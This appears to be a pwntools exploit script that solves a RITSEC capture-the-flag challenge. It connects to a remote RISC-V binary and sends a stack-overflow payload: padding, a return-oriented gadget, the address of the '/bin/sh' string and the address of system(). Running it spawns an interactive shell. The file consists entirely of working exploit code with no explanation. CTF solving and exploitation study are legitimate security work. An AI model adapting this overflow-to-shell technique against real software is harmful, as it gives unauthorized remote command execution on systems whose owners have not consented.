from pwn import *

elf = ELF("./clue")

p = remote("ctf.ritsec.club", 30839)
# p = process(["qemu-riscv64-static", "-g", "1337", "./clue"])
# pause()

'''
   4bd50:       6562                    ld      a0,24(sp)
   4bd52:       70a2                    ld      ra,40(sp)
   4bd54:       6145                    addi    sp,sp,48
   4bd56:       8082                    ret
'''

binsh = next(elf.search(b'/bin/sh\0'))

payload  = b'A'*112
payload += p64(0x4bd50)
payload += b'A'*24
payload += p64(binsh)
payload += b'A'*8
payload += p64(elf.symbols.system)
p.sendline(payload)

p.interactive()
